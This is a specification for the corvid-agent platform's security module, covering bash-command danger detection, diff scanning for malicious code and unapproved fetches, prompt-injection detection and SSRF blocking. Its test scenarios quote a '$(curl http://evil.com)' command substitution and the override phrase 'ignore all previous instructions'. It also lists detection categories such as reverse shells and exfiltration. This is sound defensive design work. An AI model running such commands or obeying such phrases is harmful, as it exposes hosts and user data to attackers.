---
module: security
version: 1
status: draft
files:
  - server/lib/bash-security.ts
  - server/lib/code-scanner.ts
  - server/lib/fetch-detector.ts
  - server/lib/prompt-injection.ts
  - server/lib/ssrf-guard.ts
db_tables: []
depends_on:
  - specs/lib/infra.spec.md
---

# Security

## Purpose

Provides a layered defense system for the corvid-agent platform: bash command analysis and dangerous-pattern detection, malicious code scanning in git diffs, external fetch/HTTP call detection, prompt injection and social engineering detection, and SSRF protection via private IP blocking and DNS resolution validation.

## Public API

### Exported Functions

| Function | Parameters | Returns | Description |
|----------|-----------|---------|-------------|
| `tokenizeBashCommand` | `command: string` | `string[]` | Quote-aware bash tokenizer handling single quotes, double quotes, backslash escaping, and shell operators. Strips quotes from tokens. |
| `extractPathsFromCommand` | `command: string` | `string[]` | Extracts candidate file paths from a bash command, filtering out flags, shell operators, and common command names. |
| `detectDangerousPatterns` | `command: string` | `DangerousPatternResult` | Detects bash patterns that could bypass path protection: command substitution, variable expansion, heredoc, eval/exec, shell -c, env wrappers, find -delete/-exec. |
| `analyzeBashCommand` | `command: string` | `BashCommandAnalysis` | Full analysis entry point: tokenizes, extracts paths, and checks for dangerous patterns in a single call. |
| `scanDiff` (code-scanner) | `diff: string` | `CodeScanResult` | Scans a unified git diff for malicious code patterns in added lines (eval, child_process, obfuscation, crypto mining, reverse shells). Tracks current file via diff headers. |
| `formatScanReport` (code-scanner) | `result: CodeScanResult` | `string` | Formats code scan results into a human-readable report separating critical findings from warnings. Returns empty string if no findings. |
| `extractDomain` | `url: string` | `string \| null` | Extracts the hostname from a URL string, handling template literals. Returns null for malformed URLs. |
| `isDomainApproved` | `domain: string` | `boolean` | Checks if a domain is in the approved list, including subdomain matching. |
| `scanDiff` (fetch-detector) | `diff: string` | `FetchScanResult` | Scans a unified git diff for new external fetch/HTTP calls to unapproved domains. Only examines added lines. |
| `formatScanReport` (fetch-detector) | `result: FetchScanResult` | `string` | Formats fetch scan results into a human-readable report. Returns empty string if no unapproved fetches. |
| `scanForInjection` | `message: string` | `InjectionResult` | Scans a message for prompt injection patterns across six categories. Stateless, completes in <10ms. Blocks on HIGH or CRITICAL confidence. |
| `scanGitHubContent` | `body: string` | `InjectionResult & { warning: string \| null }` | Scans GitHub issue/PR comment for social engineering and injection patterns. Returns human-readable warning string for agent prompts, or null if clean. |
| `isPrivateIPv4` | `ip: string` | `boolean` | Checks whether an IPv4 address falls in a private/reserved range (RFC1918, loopback, link-local, CGN, multicast, etc.). |
| `isPrivateIPv6` | `ip: string` | `boolean` | Checks whether an IPv6 address falls in a private/reserved range. Handles IPv4-mapped IPv6 addresses. |
| `isPrivateIP` | `ip: string` | `boolean` | Checks whether an IP address (v4 or v6) is private/reserved. Dispatches to isPrivateIPv4 or isPrivateIPv6 based on format. |
| `validateUrlTarget` | `url: string` | `Promise<string \| null>` | Resolves a hostname via DNS and checks if any resulting IPs are private. Returns blocking reason string if blocked, null if safe. |

### Exported Types

| Type | Description |
|------|-------------|
| `DangerousPatternResult` | `{ isDangerous: boolean; reason?: string }` -- result of bash dangerous-pattern detection. |
| `BashCommandAnalysis` | `{ tokens: string[]; paths: string[]; hasDangerousPatterns: boolean; reason?: string }` -- full bash command analysis result. |
| `FindingSeverity` | `'critical' \| 'warning'` -- severity level for code scan findings. |
| `CodePatternCategory` | Union of `'dynamic_code_execution' \| 'process_control' \| 'child_process' \| 'obfuscation' \| 'data_exfiltration' \| 'crypto_mining' \| 'backdoor'` -- categories for malicious code patterns. |
| `CodeScanFinding` | `{ category: CodePatternCategory; pattern: string; line: string; file: string \| null; severity: FindingSeverity }` -- single finding from code scanner. |
| `CodeScanResult` | `{ hasCriticalFindings: boolean; hasWarnings: boolean; findings: CodeScanFinding[] }` -- aggregated code scan results. |
| `FetchScanResult` | `{ hasUnapprovedFetches: boolean; findings: FetchFinding[] }` -- result from fetch detector scan. |
| `FetchFinding` | `{ url: string; domain: string; pattern: string; line: string }` -- single finding from fetch detector. |
| `InjectionConfidence` | `'LOW' \| 'MEDIUM' \| 'HIGH' \| 'CRITICAL'` -- confidence level for injection detection. |
| `InjectionCategory` | Union of `'role_impersonation' \| 'command_injection' \| 'data_exfiltration' \| 'jailbreak' \| 'encoding_attack' \| 'social_engineering'` -- categories for injection patterns. |
| `InjectionMatch` | `{ pattern: string; category: InjectionCategory; confidence: InjectionConfidence; offset: number }` -- single injection pattern match. |
| `InjectionResult` | `{ confidence: InjectionConfidence; blocked: boolean; matches: InjectionMatch[]; scanTimeMs: number }` -- aggregated injection scan result. |
| `PatternRule` | `{ name: string; regex: RegExp; category: CodePatternCategory; severity: FindingSeverity; allowedFiles?: string[] }` -- definition of a code-scanner pattern rule. |

### Exported Constants

| Constant | Type | Description |
|----------|------|-------------|
| `EXPANDED_WRITE_OPERATORS` | `RegExp` | Enhanced regex covering write/destructive bash operators (redirect, rm, mv, cp, chmod, sed -i, tee, dd, curl -o, wget, etc.). |
| `APPROVED_DOMAINS` | `Set<string>` | Set of pre-approved domains for external fetch calls (GitHub, Anthropic, OpenAI, Stripe, Telegram, Slack, Discord, Algorand indexers, localhost). |
| `ALL_PATTERNS` | `PatternRule[]` | Combined array of all critical and warning code-scanner patterns used by `scanDiff`. |

### Exported Classes

(none)

## Invariants

1. Bash tokenizer must handle single quotes, double quotes, and backslash escaping correctly; quotes are stripped from output tokens.
2. Shell operators (`|`, `||`, `&&`, `&`, `;`, `>`, `>>`, `<`, `<<`) are emitted as separate tokens.
3. Code scanner and fetch detector only examine added lines (lines starting with `+`) in unified diffs.
4. Code scanner excludes files in `server/__tests__/` and `server/lib/code-scanner.ts` (self-referential pattern definitions).
5. Code scanner skips matches inside single-line comments (`//`).
6. Code scanner deduplicates findings by `(category, pattern name, file)`.
7. Fetch detector skips domains in the `APPROVED_DOMAINS` set, including subdomain matches (e.g., `api.slack.com` matches `slack.com`).
8. Prompt injection scanner completes in <10ms for typical messages.
9. Prompt injection scanner blocks messages at HIGH or CRITICAL confidence by default.
10. Multiple MEDIUM matches (>=3) escalate to HIGH; multiple HIGH matches (>=2) escalate to CRITICAL.
11. Messages shorter than 4 characters are never flagged by the injection scanner.
12. SSRF guard blocks all RFC1918 ranges, loopback, link-local, CGN, TEST-NET, multicast, and reserved IPv4 ranges plus IPv6 unique-local, link-local, and multicast prefixes.
13. SSRF guard performs DNS resolution and checks all resolved IPs; does not block on DNS failure (lets the actual fetch handle it).
14. Warning patterns in the code scanner support file allowlists to avoid false positives in expected locations.

## Behavioral Examples

### Scenario: Bash command with command substitution
- **Given** a bash command containing `$(curl http://evil.com)`
- **When** `detectDangerousPatterns` is called
- **Then** it returns `{ isDangerous: true, reason: 'Contains command substitution: $()' }`

### Scenario: Diff with dynamic code execution in added line
- **Given** a unified diff containing `+  ev​al(userInput)` (dynamic code execution)
- **When** `scanDiff` (code-scanner) is called
- **Then** `hasCriticalFindings` is true with a finding of category `dynamic_code_execution`

### Scenario: Diff with fetch to unapproved domain
- **Given** a unified diff containing an added fetch call to an unapproved external domain
- **When** `scanDiff` (fetch-detector) is called
- **Then** `hasUnapprovedFetches` is true with the unapproved domain recorded

### Scenario: Prompt injection attempt
- **Given** a message containing "ignore all previous instructions"
- **When** `scanForInjection` is called
- **Then** result has `confidence: 'CRITICAL'` and `blocked: true`

### Scenario: SSRF attempt via private IP
- **Given** a URL `http://192.168.1.1/admin`
- **When** `validateUrlTarget` is called
- **Then** it returns a blocking reason string indicating a private IP

### Scenario: GitHub comment with social engineering
- **Given** a GitHub issue body containing code that sends wallet data to an external endpoint
- **When** `scanGitHubContent` is called
- **Then** `warning` is non-null and contains social engineering guidance for agents

## Error Cases

| Condition | Behavior |
|-----------|----------|
| Empty or null bash command | `tokenizeBashCommand` returns empty array; `analyzeBashCommand` returns empty tokens/paths, no danger |
| Malformed URL passed to `extractDomain` | Returns null (tries URL constructor, then regex fallback) |
| Malformed URL passed to `validateUrlTarget` | Returns `'Invalid URL'` string |
| DNS resolution failure in `validateUrlTarget` | Does not block; logs debug and returns null (lets the fetch handle it) |
| Empty diff passed to `scanDiff` | Returns result with no findings |
| Message shorter than 4 chars passed to `scanForInjection` | Returns `{ confidence: 'LOW', blocked: false, matches: [] }` |
| IPv4 string with invalid octets passed to `isPrivateIPv4` | Returns false (octets validated as 0-255) |
| Non-4-octet string passed to `isPrivateIPv4` | Returns false |

## Dependencies

### Consumes

| Module | What is used |
|--------|-------------|
| `lib/logger` | `createLogger` for structured logging in ssrf-guard |

### Consumed By

| Module | What is used |
|--------|-------------|
| `process/sdk-process` | `analyzeBashCommand`, `EXPANDED_WRITE_OPERATORS` for protected-path enforcement in run_command |
| `work/validation` | `scanDiff` (code-scanner), `formatScanReport` (code-scanner), `scanDiff` (fetch-detector), `formatScanReport` (fetch-detector) for post-session diff validation |
| `work/service` | `scanGitHubContent` for scanning GitHub issue/PR content before agent processing |
| `middleware/auth` | `scanForInjection` for inbound message filtering |
| `routes/*` | `validateUrlTarget` for SSRF protection on user-supplied URLs |

## Change Log

| Date | Author | Change |
|------|--------|--------|
| 2026-03-04 | corvid-agent | Initial spec |
